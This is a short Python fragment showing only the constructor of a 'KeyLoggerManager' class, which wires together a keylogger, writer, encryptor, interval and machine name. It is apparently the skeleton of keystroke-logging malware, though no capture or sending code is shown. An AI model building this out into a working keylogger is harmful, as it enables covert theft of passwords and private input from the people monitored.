class KeyLoggerManager:
    def __init__(self, keylogger, writer, encryptor, interval=5, machine_name="Machine1"):
        self.keylogger = keylogger
        self.writer = writer
        self.encryptor = encryptor
        self.interval = interval
        self.machine_name = machine_name
        self.buffer = []
        self.running = False
        self.thread = None